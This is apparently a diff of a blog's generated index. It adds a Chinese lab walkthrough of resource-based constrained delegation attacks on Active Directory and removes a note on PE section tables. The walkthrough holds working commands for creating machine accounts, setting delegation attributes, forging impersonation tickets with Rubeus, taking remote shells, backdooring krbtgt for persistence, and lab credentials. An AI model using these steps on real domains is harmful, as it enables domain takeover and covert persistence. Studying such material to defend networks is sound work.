+<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>验证bunny这个用户是否对PC2有写权限，用pwerview枚举，PC2.whoamianony.org中的特定ACE（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -Identity bunny -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity PC2  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-1315137663-3706837544-1429009142-1112&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151625486.png" class title="image-20220318151625486">
+
+<p>bunny对主机PC2有写入权限，其实不一定要GenericWrite，WriteProperty，WriteDacl都可以，当然最好的是GenericAll（完全控制权）</p>
+<p>现在需要一个具有SPN的账号，因为s4u2self只适用于具有SPN的账户，我们的目的是在之后通过s4u2proxy协议代替用户发起请求，而s4u2proxy是根据kerberos发起请求的，SPN是一种服务主体名称，域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN。恰好域中有一个属性MachineAccountQuota，这个值表示允许用户在域中创建的计算机账户数，默认为10。我们创建的账户默认注册在<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN之下。因此我们可以利用。</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318100656209.png" class title="image-20220318100656209">
 
 
 
-<p>使用lordPE查看区段表</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323101610691.png" class title="image-20220323101610691">
+<p>使用powermad中的New-MachineAccount注册一个计算机用户win7，密码为win7</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount win7 -Domain whoamianony.org -DomainController DC.whoamianony.org -Verbose</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151835228.png" class title="image-20220318151835228">
 
 
 
-<p>根据区段的基本特征打印相关属性</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323103652084.png" class title="image-20220323103652084">
+<p>查看是否添加成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
 
-<p>成功打印出了区段的属性</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323103817136.png" class title="image-20220323103817136">
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151858125.png" class title="image-20220318151858125">
 
-<p>与LordPE进行对比是没有错误的，这就是一次对区段表的遍历</p>
+
+
+<p>查看spn票据，能添加成功机器账号肯定是有spn的，但还是可以查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn —q */* | findstr &quot;win7&quot;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151956537.png" class title="image-20220318151956537">
+
+
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131103230.png" class title="image-20220318131103230">
+
+<p>这是新添加的win7的机器用户  </p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131156113.png" class title="image-20220318131156113">
+
+<p>这是要修改的属性，根据微软官方文档的解释，此属性用于访问检查以确定请求者是否有权代表其他身份对以此帐户运行的服务进行操作。<strong>注：这里截图截错了应该是看PC2的msDS-AllowedToActOnBehalfOfOtherIdentity的值为未设置</strong></p>
+<p>修改PC2的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值，有两种方法</p>
+<p><strong>一、powerview脚本</strong></p>
+<p>首先使用pwerview脚本查看机器账户win7的sid</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Identity win7</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152113521.png" class title="image-20220318152113521">
+
+
+
+<p>然后配置win7到PC2的基于资源约束的委派（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer PC2| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152253325.png" class title="image-20220318152253325">
+
+
+
+<p>验证是否成功添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer PC2 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
+
+<p>不为空就修改成功</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152406051.png" class title="image-20220318152406051">
+
+<p>在域控上查看msds-allowedtoactonbehalfofotheridentity的值可以看到是字节数组，所以不能直接用字符串型</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318132830587.png" class title="image-20220318132830587">
+
+
+
+<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject PC2 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>
+
+<p><strong>二、通过ActiveDirectory模块添加</strong></p>
+<p>只有Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项，域内普通主机是不存在ActiveDirectory模块的，但是可以将DLL文件复制出来，然后导入即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer PC2 -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADComputer PC2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318133951958.png" class title="image-20220318133951958">
+
+<p>这里已经添加过了，就不再演示了</p>
+<h2 id="进行攻击"><a href="#进行攻击" class="headerlink" title="进行攻击"></a>进行攻击</h2><h3 id="典型的基于资源约束委派攻击"><a href="#典型的基于资源约束委派攻击" class="headerlink" title="典型的基于资源约束委派攻击"></a>典型的基于资源约束委派攻击</h3><p>现在没有票据是肯定无法访问PC2的</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318155719648.png" class title="image-20220318155719648">
+
+
+
+<p>rubeus是不支持明文密码的，先将创建的机器用户的密码转换成hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:win7 /password:win7 /domain:whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318153253944.png" class title="image-20220318153253944">
+
+
+
+<p>然后用win7的rc4  hash值请求一个可转发的票据（相当于白银票据），并且导入到内存中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161255297.png" class title="image-20220318161255297">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161307765.png" class title="image-20220318161307765">
+
+
+
+<p>cifs是文件共享，还需要导入host服务的票据才能psexec</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161343840.png" class title="image-20220318161343840">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161423491.png" class title="image-20220318161423491">
+
+<p>接下来可以正常用psexec获得一个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\PC2 -s cmd</span><br><span class="line">Python3 getSt.py -dc-ip 192.168.93.40 -spn cifs/oa -impersonate Administrator whoamianony.org/whoamianony:win7:win7</span><br></pre></td></tr></table></figure>
+
+<p>使用impacket工具包只要获得一个cifs凭据即可获得PC2的shell</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161609684.png" class title="image-20220318161609684">
+
+<h3 id="解决敏感用户不可委派问题"><a href="#解决敏感用户不可委派问题" class="headerlink" title="解决敏感用户不可委派问题"></a>解决敏感用户不可委派问题</h3><p>利用条件：知道目标的主机账户的凭证</p>
+<p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318144136403.png" class title="image-20220318144136403">
+
+
+
+<p>清除票据</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162000613.png" class title="image-20220318162000613">
+
+<p>此时再去申请票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162252245.png" class title="image-20220318162252245">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162307877.png" class title="image-20220318162307877">
+
+<p>当账户不可委派以及受保护组的成员可以完成S4U2Self，不能完成S4U2proxy，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，可以看到该票据是没有服务名称的，并且不可转发。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe describe /ticket:申请的票据的base64值</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318174454339.png" class title="image-20220318174454339">
+
+<p>这里可以看到申请的servicename本来应该为cifs&#x2F;PC2（host&#x2F;PC2），但是这里只有win7，这是因为服务名称丢失了，只需要补上就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>
+
+<p>如下（这里我一直使用的是加密后的base64，因为使用kirbi会报莫名其妙的错误）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:请求cifs票据的base64值 /altservice:cifs/PC2.whoamianony.org /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:请求host票据的base64值 /altservice:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
+
+<p>未申请之前</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175059468.png" class title="image-20220318175059468">
+
+
+
+<p>申请之后</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175404412.png" class title="image-20220318175404412">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175630923.png" class title="image-20220318175630923">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318180737281.png" class title="image-20220318180737281">
+
+<p>这里申请host的票据也是一样的步骤，就不再赘述了</p>
+<h3 id="利用基于资源的约束委派进行域权限维持"><a href="#利用基于资源的约束委派进行域权限维持" class="headerlink" title="利用基于资源的约束委派进行域权限维持"></a>利用基于资源的约束委派进行域权限维持</h3><p>主要思想是：在获得域控的管理员权限后，修改krbtgt或是域控的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，加入已知后门账户的SID。</p>
+<p>根据这样基于资源的约束委派攻击生成白银票据的方式进行权限维持</p>
+<p>1、配置注册的主机账号（比如我这里的主机账号是win7）到krbtgt基于资源的约束委派</p>
+<p>2、配置注册的主机账号（比如我这里的主机账号是win7）到域控基于资源的约束委派</p>
+<p>这是windows 版本在2012之下（我的域控是2012的，所以这里选择第二种方法）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在windows版本在2012及以上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318202451168.png" class title="image-20220318202451168">
+
+<p>注意这是做权限维持，这是在域控上操作的</p>
+<p>修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，我们已经做好了后门了，然后就可以请求TGT</p>
+<p>请求成功！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203355644.png" class title="image-20220318203355644">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203411815.png" class title="image-20220318203411815">
+
+<p>然后利用s4u2proxy返回的TGT去申请一张访问域控cifs服务的ST2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:win7$ /enctype:rc4 /service:cifs/DC /domain:whoamianony.org /ticket:请求的ST2的base64 /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204344841.png" class title="image-20220318204344841">
+
+<p>我不知道为什么这里报了一个小错误，但确实可以请求一个ST访问域控了。请求host服务一样的方法</p>
+<p>这样请求票据只能一个一个请求，用impacket工具包会方便很多</p>
+<p>这里先删除票据</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204546537.png" class title="image-20220318204546537">
+
+
+
+<p>使用impacket工具，这里我不知道为什么一直无法将票据进行设置，原理是没错的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getst_windows.exe -dc-ip 192.168.93.30 -spn krbtgt -impersonate Administrator whoamianony.org/win7$:win7</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=Administrator.ccache</span><br><span class="line">wmiexec.exe -no-pass -k DC</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="在域外进行基于资源的约束委派攻击"><a href="#在域外进行基于资源的约束委派攻击" class="headerlink" title="在域外进行基于资源的约束委派攻击"></a>在域外进行基于资源的约束委派攻击</h3><p>SharpAllowedToAct可以自动生成机器账户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hacker -p hacker -t PC2 -a 192.168.93.30 whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223625113.png" class title="image-20220318223625113">
+
+<p>可以看到确实生成了用户</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223702223.png" class title="image-20220318223702223">
+
+
+
+<p>获得服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.93.30 whoamianony/hacker\$:hacker -spn cifs/PC2.whoamianony.org -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318224914156.png" class title="image-20220318224914156">
+
+<p>将票据导入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接连接目标机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k PC2.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318232610317.png" class title="image-20220318232610317">
+
+<p>这里有个坑，要在&#x2F;etc&#x2F;hosts下手动把PC2.whoamianony.org解析成192.168.93.40</p>
+<p>impacket工具包里面的脚本是可以完成基于资源的约束委派的攻击的，这里就不再研究了，原理都是一样的，只是使用的脚本方法不一样。</p>
 ]]></content>
       <categories>
-        <category>逆向</category>
+        <category>内网</category>
       </categories>
       <tags>
-        <tag>PE</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1087,7 +1087,7 @@
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102956972.png" class title="image-20220317102956972">
 
 <p>此时就配置完成了moretz（PC2）对DC的cifs的委派</p>
-<h2 id="0x01发现委派主机"><a href="#0x01发现委派主机" class="headerlink" title="0x01发现委派主机"></a>0x01发现委派主机</h2><h3 id="idapsearch"><a href="#idapsearch" class="headerlink" title="idapsearch"></a>idapsearch</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="0x01发现委派主机"><a href="#0x01发现委派主机" class="headerlink" title="0x01发现委派主机"></a>0x01发现委派主机</h2><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
 
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317101321257.png" class title="image-20220317101321257">
 
